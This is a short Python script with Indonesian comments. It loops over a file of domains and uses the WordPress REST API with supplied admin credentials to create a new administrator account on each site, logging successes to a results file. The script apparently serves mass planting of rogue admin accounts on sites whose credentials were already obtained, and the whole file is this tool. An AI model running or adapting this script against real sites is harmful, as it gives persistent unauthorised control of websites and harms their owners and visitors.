import sys
import requests
from requests.auth import HTTPBasicAuth

# Fungsi untuk menambah admin
def add_admin(domain, wp_user, wp_pass, new_user, new_pass, new_email):
    url = f"http://{domain}/wp-json/wp/v2/users"
    user_data = {
        "username": new_user,
        "password": new_pass,
        "email": new_email,
        "roles": ["administrator"]
    }

    try:
        # Kirim permintaan POST dengan autentikasi dasar
        response = requests.post(url, json=user_data, auth=HTTPBasicAuth(wp_user, wp_pass))

        # Cek status code dan output hasil
        if response.status_code == 201:
            result = f"https://{domain}/ > berhasil add admin"
            print(result)
            # Simpan hasil berhasil ke dalam file
            with open('result.txt', 'a') as file:
                file.write(f"{domain} > berhasil add admin\n")
        else:
            print(f"https://{domain}/ > gagal add admin")
    except Exception as e:
        print(f"https://{domain}/ > gagal add admin")

# Fungsi utama
def main():
    if len(sys.argv) != 2:
        print("Penggunaan: python add_admin.py <listdomain.txt>")
        sys.exit(1)

    # Load domain dari file
    with open(sys.argv[1], 'r') as file:
        domains = file.read().splitlines()

    # Data admin baru
    new_user = "newadmin"
    new_pass = "StrongPassword123!"
    new_email = "newadmin@example.com"

    # Loop setiap domain
    for domain in domains:
        add_admin(domain, "existing_admin", "existing_password", new_user, new_pass, new_email)

if __name__ == "__main__":
    main()
